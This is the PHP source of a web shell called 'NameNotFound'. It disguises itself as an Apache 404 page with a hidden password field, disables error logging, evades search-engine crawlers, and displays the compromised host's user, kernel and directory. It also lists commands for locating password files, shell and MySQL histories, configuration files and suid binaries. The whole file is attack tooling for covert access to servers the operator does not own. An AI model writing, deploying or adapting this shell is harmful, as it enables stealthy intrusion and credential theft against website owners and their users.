<?php

/* ----------------- */
/* -   Variables   - */
/* ----------------- */

/* >>>>>>>>>>>>>>>>> */
    @define('VERSION', '1.1c');
    @define('NAME', 'NameNotFound');
    @define('AUTHOR', 'CosasDePuma');

    // Colour Theme : https://coolors.co/a393bf-9882ac-73648a-453750-0c0910
    $theme = array(
        "white" => "#fff",
        "lighter" => "#A393BF",
        "light" => "#9882AC",
        "mid" => "#73648A",
        "dark" => "#453750",
        "darker" => "#0C0910"
    );

    $passphrase = "136c757bdd877848762c248e58252935"; //md5 x3 (cosasdepuma)

/* ----------------- */
/* - Configuration - */
/* ----------------- */

/* >>>>>>>>>>>>>>>>> */
    @set_time_limit(0); // Unlimited execution time
    @error_reporting(0); // Disable errors and warnings
    @session_start(); // Create or resume the current session

    // Rewrite php.ini file
    @ini_set('error_log',NULL); // No error log file
    @ini_set('log_errors',0); // Don't write errors in log
    @ini_set('max_execution_time',0); // Unlimited execution time

    // Magic Quotes!
    if (version_compare(PHP_VERSION, '5.3.0', '<')) {
        @set_magic_quotes_runtime(0);
        // Check Magic Quotes (It's important...)
        if(get_magic_quotes_gpc()) {
            function stripslashes_array($array) { 
                return is_array($array) ? array_map('stripslashes_array', $array) : stripslashes($array); 
            }
            $_POST = stripslashes_array($_POST);
        }
    }

    // Headers!
    header('HTTP/1.0 404 Not Found');
    header('X-Powered-By: Pumas writting Assembly Code');
    
    // Robots!
    if( strpos($_SERVER['HTTP_USER_AGENT'],'MSNBot') !== false ) exit; // Avoid Bing robots
    if( strpos($_SERVER['HTTP_USER_AGENT'],'Slurp') !== false ) exit; // Avoid Yahoo! robots
    if( strpos($_SERVER['HTTP_USER_AGENT'],'Google') !== false ) exit; // Avoid Google robots
    if( strpos($_SERVER['HTTP_USER_AGENT'],'Yandex') !== false ) exit; // Avoid Yandex robots
    if( strpos($_SERVER['HTTP_USER_AGENT'],'Rambler') !== false ) exit; // Avoid Rambler robots
    if( strpos($_SERVER['HTTP_USER_AGENT'],'ia_archiver') !== false ) exit; // Avoid Archive.org robots


/* ----------------- */
/* -   Functions   - */
/* ----------------- */

/* >>>>>>>>>>>>>>>>> */
    function ApacheNotFound() {
        // Close PHP and start HTML
        ?>

        <h1>Not Found</h1> 
        <p>The requested URL <?=dirname(($_SERVER['REQUEST_URI']))?> was not found on this server.</p>
        <hr>
        <address>Apache Server at <?=$_SERVER['HTTP_HOST']?> Port <?=$_SERVER['SERVER_PORT']?></address>
        </body>

        <center>
        <form method="post"> 
        <input style="margin:0; background-color: #fff; border: 0px" type="password" name="passwd"> 
        </form></center> 

        <?php
        // Close HTML and start PHP
        exit;
    }

    function GetSysInfo() {
        //Check OS Enviroment
        if(strtolower(substr(PHP_OS,0,3)) == "win") $GLOBALS["info"]["os"] = "win";
        else $GLOBALS["info"]["os"] = "nix";
        return;
    }

    function GetDirectory() {
        // Get where the WebShell is located
        $GLOBALS["info"]["home_dir"] = getcwd();
        // Which is the Current WorkDir?
        if(isset($_POST['wd']))
            @chdir($_POST['wd']);
        $GLOBALS["info"]["current_dir"] = getcwd();
        // Change the Current WorkDir to Linux Path Format
        if($GLOBALS["info"]["os"] == "win") {
            $GLOBALS["info"]["home_dir"] = str_replace("\\", "/", $GLOBALS["info"]["home_dir"]);
            $GLOBALS["info"]["current_dir"] = str_replace("\\", "/", $GLOBALS["info"]["current_dir"]);
        }
        // Append the last slash
        if( $GLOBALS["info"]["current_dir"][strlen($GLOBALS["info"]["current_dir"])-1] != '/' ) 
            $GLOBALS["info"]["current_dir"] .= '/'; 
        return;
    }

    function SetCommands() {
        // Windows Available Commands
        if($GLOBALS["info"]["os"] == "win") {
            $aliases = array(
                "ARP Table" => "arp -a",
                "Find *config*.php in Current Dir" => "dir /s /w /b *config*.php",
                "Find index.php in Current Dir" => "dir /s /w /b index.php",
                "IP Configuration" => "ipconfig /all",
                "List Directory" => "dir",
                "Show Active Connections" => "netstat -an",
                "Show Computers" => "net view",
                "Show Running Services" => "net start",
                "User Accounts" => "net user"
            );
        } else {
            // *nix Available Commands
            $aliases = array(
                "Find" => "",
                    "Find .bash_history files in Current Dir" => "find . -type f -name .bash_history",
                    "Find .fetchmailrc files in Current Dir" => "find . -type f -name .fetchmailrc",
                    "Find .htpasswd files in Current Dir" => "find . -type f -name .htpasswd",
                    "Find all .bash_history files" => "find / -type f -name .bash_history",
                    "Find all .fetchmailrc files" => "find / -type f -name .fetchmailrc",
                    "Find all .htpasswd files" => "find / -type f -name .htpasswd",
                    "Find all sgid files" => "find / -type f -perm -02000 -ls",
                    "Find all suid files" => "find / -type f -perm -04000 -ls",
                    "Find config* files" => "find / -type f -name \"config*\"",
                    "Find config* files in Current Dir" => "find . -type f -name \"config*\"",
                    "Find config.inc.php files" => "find / -type f -name config.inc.php",
                    "Find all service.pwd files" => "find / -type f -name service.pwd",
                    "Find all writable folders and files" => "find / -perm -2 -ls",
                    "Find all writable folders and files in Current Dir" => "find . -perm -2 -ls",
                    "Find service.pwd files in Current Dir" => "find . -type f -name service.pwd",
                    "Find sgid files in current dir" => "find . -type f -perm -02000 -ls",
                    "Find suid files in current dir" => "find . -type f -perm -04000 -ls",
                "List Dir" => "ls -la",
                "List file attributes on a Linux Second Extended File System" => "lsattr -va",
                "Locate" => "",
                    "Locate .bash_history files" => "locate '.bash_history'",
                    "Locate .conf files"=>"locate '.conf'",
                    "Locate .fetchmailrc files" => "locate '.fetchmailrc'",
                    "Locate .htpasswd files" => "locate '.htpasswd'",
                    "Locate .pwd files" => "locate '.pwd'",
                    "Locate .sql files" => "locate '.sql'",
                    "Locate .mysql_history files" => "locate '.mysql_history'",
                    "Locate admin.php files" =>"locate admin.php",
                    "Locate backup files" => "locate backup",
                    "Locate cfg.php files" => "locate cfg.php",
                    "Locate conf.php files" => "locate conf.php",
                    "Locate config* files " => "locate config",
                    "Locate config.dat files" => "locate config.dat",
                    "Locate config.default.php files" => "locate config.default.php",
                    "Locate config.inc files" => "locate config.inc",
                    "Locate config.inc.php files" => "locate config.inc.php",
                    "Locate config.php files" => "locate config.php",
                    "Locate dump files" => "locate dump",
                    "Locate httpd.conf files" => "locate httpd.conf",
                    "Locate vhosts.conf files" => "locate vhosts.conf",
                    "Locate priv files" => "locate priv",
                    "Locate proftpd.conf files" => "locate proftpd.conf",
                    "Locate psybnc.conf files" => "locate psybnc.conf",
                    "Locate my.conf files" => "locate my.conf",
                "Show Opened Ports" => "netstat -an | grep -i listen"
            );
        }
    }

    function ShowControlPanel() {
        // Set headers
        header("Content-Type: text/html; charset=UTF-8");
        // Get information about target
        if(!function_exists('posix_getegid')) {
            $user = @get_current_user();
            $uid = @getmyuid();
            $gid = @getmygid();
            $group = "?";
        } else {
            $uid = @posix_getpwuid(@posix_geteuid());
            $gid = @posix_getgrgid(@posix_getegid());
            $user = $uid['name'];
            $uid = $uid['uid'];
            $group = $gid['name'];
            $gid = $gid['gid'];
        }
        ?>
            <head>
                <title><?=$_SERVER['HTTP_HOST']?> - <?=NAME?> v<?=VERSION?> (designed by <?=AUTHOR?>)</title>
                <!-- Set Styles -->
                <style>
                body { background-color: <?=$GLOBALS["theme"]["darker"]?>; color: <?=$GLOBALS["theme"]["lighter"]?>; }
                    h1 { border: 0.1em solid <?=$GLOBALS["theme"]["mid"]?>; font: 1.5em Verdana; margin: 0em; padding: 0.5em 0.5em; text-align: center; }       
                    li { border: 0.1em solid <?=$GLOBALS["theme"]["mid"]?>; display: inline; font: 1em Verdana; padding: 0.5em 0.5em; }
                    li span { color: <?=$GLOBALS["theme"]["white"]?> }
                    ul { margin-top: 1em; margin-bottom: 1.5em;  text-align: center; }
                </style>
            </head>
            <body>
                <!-- Information about target -->
                <ul>
                    <li>User: <span><?=$user?> (<?=$uid?>)</span>
                        Group: <span><?=$group?> (<?=$giduser?>)</span></li>
                    <li>Server IP: <span><?=$_SERVER["HTTP_HOST"]?></span></li>
                    <li>Current Dir: <span><?=$GLOBALS["info"]["current_dir"]?></span></li>
                    <li>Kernel: <span><?=substr(@php_uname('s'), 0, 120)?></span>
                        Release: <span><?=substr(@php_uname('r'), 0, 120)?></span></li>
                </ul>
            </body>
        <?php
    }

    /* ----------------- */
    /* -    Threads    - */
    /* ----------------- */

/* >>>>>>>>>>>>>>>>> */
    // Log out
    if(isset($_GET['out'])) {
        unset($_SESSION[md5($_SERVER['HTTP_HOST'])]);
        header("Location: http://" . $_SERVER['HTTP_HOST'] . "/");
        die();
    }

    // Check if we are not logging
    if(!isset($_SESSION[md5($_SERVER['HTTP_HOST'])])) {
        // Check if:
        // - Login is necessary
        // - Password equals Passphrase
        if(empty($passphrase) || (isset($_POST['passwd']) && (md5(md5(md5($_POST['passwd']))) == $passphrase))) {
            // Login and active the session
            $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
        } else {
            /// Display NotFound page
            ApacheNotFound();
        }
    }

    $info["home_dir"] = @getcwd();

    // Do cool things!
    GetSysInfo(); GetDirectory(); SetCommands(); ShowControlPanel();
?>